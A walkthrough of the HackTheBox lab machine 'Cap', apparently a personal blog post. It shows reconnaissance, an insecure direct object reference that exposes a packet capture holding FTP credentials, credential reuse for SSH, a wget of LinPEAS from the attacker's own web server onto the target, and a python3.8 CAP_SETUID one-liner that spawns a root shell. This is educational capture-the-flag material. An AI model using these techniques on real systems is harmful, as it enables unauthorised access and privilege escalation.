---
title: "Walk-through of Cap from HackTHeBox"
header:
  teaser: /assets/images/2021-09-25-22-34-04.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - PCAP
  - LinPEAS
  - CAP_SETUID
---

## Machine Information

![cap](/assets/images/2021-09-25-22-34-04.png)

Cap is rated a an easy machine on HackTheBox. After an initial scan we find a few ports open, a website running on port 80 is our starting point. There we find a simple system monitoring site with an ability to run scans and save the results to a PCAP file. After enumeration of the site we find a pre-saved file that contains user credentials. These give us SSH access, and from there enumeration of the box reveals incorrect CAP_SETUID permissions on a python executable. We use these to spawn a root shell and complete the box.

<!--more-->

Skills required are web and OS enumeration. Skills learned are examining PCAP files in WireShark, and using enumeration scripts to find vulnerabilities.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Cap](https://www.hackthebox.eu/home/machines/profile/351) |
| Machine Release Date | 5th May 2021 |
| Date I Completed It | 24th September 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/cap]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.245 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/htb/cap]
└─# nmap -p$ports -sC -sV -oA cap 10.10.10.245
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-25 22:33 BST
Nmap scan report for 10.10.10.245
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sat, 25 Sep 2021 21:33:32 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 25 Sep 2021 21:33:27 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 25 Sep 2021 21:33:27 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=9/25%Time=614F95A9%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
<SNIP>
SF:r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>
SF:\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.10 seconds
```

A few ports open, let's look at what's running on port 80 first:

![cap-dashboard](/assets/images/2021-09-25-22-49-25.png)

## Website Enumeration

Not a lot here, but clicking around I find an option that says Security Snapshot (5 Second PCAP + Analysis). Clicking it we get this page:

![cap-capture](/assets/images/2021-09-25-22-54-00.png)

There's a download button but if you click it the file you get is empty. Clicking the snapshot button again I notice the url changes from data/10 to data/11. I tried data/0 to see what happens:

![cap-cap0](/assets/images/2021-09-25-22-57-44.png)

## WireShark

This time the page shows 72 packets had been captured. Downloading the PCAP file and opening it in WireShark let's us have a look through it:

![cap-wireshark](/assets/images/2021-09-25-23-00-10.png)

With it being so small we quickly find credentials:

```text
36	4.126500	192.168.196.1	192.168.196.16	FTP	69	Request: USER nathan
40	5.424998	192.168.196.1	192.168.196.16	FTP	78	Request: PASS <HIDDEN>
```

## FTP Access

We found FTP was open earlier, so it's safe to assume these are the credentials to get in. Let give it a try:

```text
┌──(root💀kali)-[~/htb/cap]
└─# ftp 10.10.10.245
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:kali): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Sep 25 17:37 user.txt
226 Directory send OK.
ftp> pwd
257 "/home/nathan" is the current directory
```

## SSH Access

They work, and interestingly we are in Nathans home folder on the server. Before going any further with FTP I drop out and try SSH:

```text
┌──(root💀kali)-[~/htb/cap]
└─# ssh nathan@10.10.10.245
nathan@10.10.10.245's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

Last login: Sat Sep 25 21:06:17 2021 from 10.10.14.178
nathan@cap:~$
```

## User Flag

Credentials were reused for SSH! Let's grab the user flag:

```text
nathan@cap:~$ ls -ls
4 -r-------- 1 nathan nathan 33 Sep 25 17:37 user.txt

nathan@cap:~$ cat user.txt 
<HIDDEN>
```

## LinPEAS Enumeration

Time for some enumeration, let's get the latest version of LinPEAS from [here](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):

```text
┌──(root💀kali)-[~/htb/cap]
└─# wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
--2021-09-25 23:10:49--  https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 473371 (462K) [text/plain]
Saving to: ‘linpeas.sh’
linpeas.sh              100%[=========================================================>] 462.28K  --.-KB/s    in 0.07s   
2021-09-25 23:10:50 (6.02 MB/s) - ‘linpeas.sh’ saved [473371/473371]
```

Start a web server so we call pull it across:

```text
┌──(root💀kali)-[~/htb/cap]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Switch back to box and grab it:

```text
nathan@cap:~$ wget http://10.10.14.22/linpeas.sh
--2021-09-25 22:11:33--  http://10.10.14.22/linpeas.sh
Connecting to 10.10.14.22:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 473371 (462K) [text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh           100%[===================>] 462.28K  2.20MB/s    in 0.2s    
2021-09-25 22:11:33 (2.20 MB/s) - ‘linpeas.sh’ saved [473371/473371]
```

Make it executable, run and redirect output to a file:

```text
nathan@cap:~$ chmod +x linpeas.sh 
nathan@cap:~$ ./linpeas.sh > linpeas.txt
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
```

## Exploiting Capabilities 

As always the output is long so we have to take time to look through it properly. When I get to the capabilities section I see the python3.8 binary is misconfigured:

```text
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                                                                                                   
Current capabilities:                                                                                                                                                                                                                        
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

HackTricks has an explanation [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) on how to abuse the CAP_SEETUID capability with an example we can use [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#exploitation-example). So let's do it:

```text
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~#
```

## Root Flag

There, as simple as that and we're now root. Let's grab the flag:

```text
root@cap:~# cat /root/root.txt
<HIDDEN>
```

That was a nice. I hope you enjoyed it and many thanks to [InfoSecJack](https://twitter.com/InfoSecJack) for creating the box.

See you next time.
